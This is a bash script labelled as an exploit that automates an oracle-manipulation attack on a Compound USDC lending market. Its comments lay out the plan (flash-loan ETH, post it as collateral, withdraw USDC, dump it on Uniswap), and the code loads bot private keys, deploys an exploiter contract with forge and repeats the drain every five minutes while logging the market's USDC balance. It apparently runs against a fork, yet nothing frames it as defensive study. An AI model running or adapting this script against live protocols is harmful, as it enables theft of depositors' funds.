#! /bin/bash
echo "***EXPLOIT***"

# Assumes oracle control
# Flash loan ETH
# Convert to WETH
# Deposit into Compound
# Withdraw USDC
# Dump USDC on Uniswap
# Withdraw back to ETH

# Configure Key
BOT="${BOT:=1}" && \
echo "BOT $BOT" && \
ADDRESS_NAME="ADDRESS_BOT_$BOT" && \
PRIVATE_KEY_NAME="PRIVATEKEY_BOT_$BOT" && \
export ME="${!ADDRESS_NAME}";
export PRIVATE_KEY="${!PRIVATE_KEY_NAME}";
export DRAIN_TARGET=$DRAIN_TARGET

{
    
    for i in {1..10}
    do
        # for ASSET in WETH WBTC LINK
        for ASSET in WETH
        do
            PRICE_FEED_NAME="PRICE_FEED_$ASSET" && \
            {
                PRICE_FEED="${!PRICE_FEED_NAME}";
                
                echo "***COMP BALANCES BEFORE***"
                
                echo "USDC"
                cast call $USDC "balanceOf(address)(uint256)" $CUSDC --rpc-url $RPC_URL
                
                ASSET_ADDRESS="${!ASSET}";
                echo "***Exploiting with $ASSET $ASSET_ADDRESS***" && \
                # echo "***Exploiting with $ASSET $ASSET_ADDRESS***"
                
                # TODO check price spread with mainnet
                MAINNET_PRICE=$( cast call $CUSDC "getPrice(address)(uint256)" $PRICE_FEED --rpc-url $MAINNET) && \
                echo "***Mainnet price for $ASSET : $MAINNET_PRICE***" && \
                # echo "***Mainnet price for $ASSET : $MAINNET_PRICE***"
                
                FORK_PRICE=$( cast call $CUSDC "getPrice(address)(uint256)" $PRICE_FEED --rpc-url $RPC_URL) && \
                echo "***Fork price for $ASSET : $FORK_PRICE***" && \
                # echo "***Fork price for $ASSET : $FORK_PRICE***"
                
                PRIVATE_KEY=$PRIVATE_KEY forge script script/DeployExploit.s.sol:Deploy --fork-url $RPC_URL --broadcast > /tmp/exploiter && \
                EXPLOITER=`cat /tmp/exploiter | grep "Contract Address:" | sed 's/^.*: //'` && \
                echo "Exploiter addres $EXPLOITER"
                EXPLOITER=$EXPLOITER ASSET=$ASSET_ADDRESS forge script script/Exploit.s.sol:Exploit --fork-url $RPC_URL --broadcast
                
                echo "***COMP BALANCES AFTER***"
                
                echo "USDC"
                cast call $USDC "balanceOf(address)(uint256)" $CUSDC --rpc-url $RPC_URL
            }
        done
        
        echo "Next exploit in 5 minutes"
        sleep 300
    done
}

exit 0